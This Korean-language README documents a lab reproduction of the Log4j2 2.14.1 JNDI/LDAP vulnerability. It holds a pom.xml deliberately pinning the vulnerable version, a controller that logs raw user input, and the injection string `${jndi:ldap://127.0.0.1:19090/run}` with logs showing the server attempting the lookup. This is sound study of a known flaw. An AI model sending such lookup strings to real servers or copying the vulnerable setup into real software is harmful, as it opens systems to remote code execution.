# Log4j2 2.14.1 LDAP 취약점 확인



## [target-server](target-server)

* pom.xml : Log4j2 버전을 취약버전으로 낮춤

  ```xml
  <properties>
    <java.version>11</java.version>
    <!-- Spring Boot 2.6.2는 2.17.0 디펜던시를 가지지만, 일부러 버전을 낮춘다.-->
    <log4j2.version>2.14.1</log4j2.version>
  </properties>
  ```

* LoggingController : 사용자의 입력을 그대로 받아 로깅하는 컨트롤러 메서드 추가
  ```java
    @PostMapping("/form")
    public String form(String ldapString, RedirectAttributes rttr) {
      try {
        LOGGER.info("{}", ldapString);
        rttr.addFlashAttribute("exception", "예외 발생 X");
      } catch (Exception e) {
        rttr.addFlashAttribute("exception", "예외발생 O: " + e.getMessage());
      }
      return "redirect:/";
    }
  ```

* 브라우저 실행

  ![target-server-view.png](doc-resources/target-server-view.png)



### 동작 확인 내용

1. 실제로 `${jndi:ldap://127.0.0.1:19090/run}` 문자열을 서버로 전송했을 때, 서버가 `127.0.0.1:19090` 로 접속을 시도한다.

   ```
   2022-01-03 13:16:52.526  INFO 14736 --- [nio-8080-exec-7] o.m.t.c.LoggingController                : ${jndi:ldap://127.0.0.1:19090/run}
   2022-01-03 13:17:09,993 http-nio-8080-exec-10 WARN Error looking up JNDI resource [ldap://127.0.0.1:19090/run]. javax.naming.CommunicationException: 127.0.0.1:19090 [Root exception is java.net.ConnectException: Connection refused: connect]
   ...
   ```

   로컬의 19090 포트에 LDAP 서버가  켜져 있는 것은 아니여서 `Connection refused: connect` 예외로 에러 로그가 남음.

2. `LOGGER.info("{}", ldapString);` 코드에서 **JNDI 에러 예외가 던져지지 않았다.** 

   * 로그를 자세하게 확인하지 않고 지나가면 잊고 지나가기 쉬운 문제인 것 같다.





## [ldap-server](ldap-server)  : TODO 어떻게할지 아직 잘 모르겠음. 

* LDAP 서버 구성을 어떻게 해야할지 몰라서 제대로 하진 못했다. 😒
* https://github.com/veracode-research/rogue-jndi  이 코드를 연구해보면 뭔가 할 수 있을 것 같긴한데 ... 천천히 진행해보자!





## 의견

[target-server](target-server) 프로젝트에서 확인한 내용만으로도, 위험한게 확실해보이고, 반드시 log4j2 버전업을 해야될 문제 같다.

